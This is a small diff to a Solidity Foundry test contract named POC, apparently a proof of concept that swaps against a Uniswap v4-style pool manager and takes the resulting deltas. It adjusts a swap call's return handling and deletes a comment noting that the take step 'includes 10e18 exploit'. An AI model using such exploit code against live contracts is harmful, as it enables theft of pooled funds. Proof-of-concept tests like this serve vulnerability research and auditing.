@@ -62,9 +62,8 @@ contract POC is Test {
             if (amt0 > 0) manager.take(c0, address(this), uint128(amt0));
             if (amt1 > 0) manager.take(c1, address(this), uint128(amt1));
         } else {
-            (BalanceDelta sDelta,) = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
+            BalanceDelta sDelta = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
             (int128 s0, int128 s1) = _getDeltas(sDelta);
-            // settle what WE owe, take what pool owes us (includes 10e18 exploit)
             if (s0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-s0)); manager.settle(); }
             if (s1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-s1)); manager.settle(); }
             if (s0 > 0) manager.take(c0, address(this), uint128(s0));
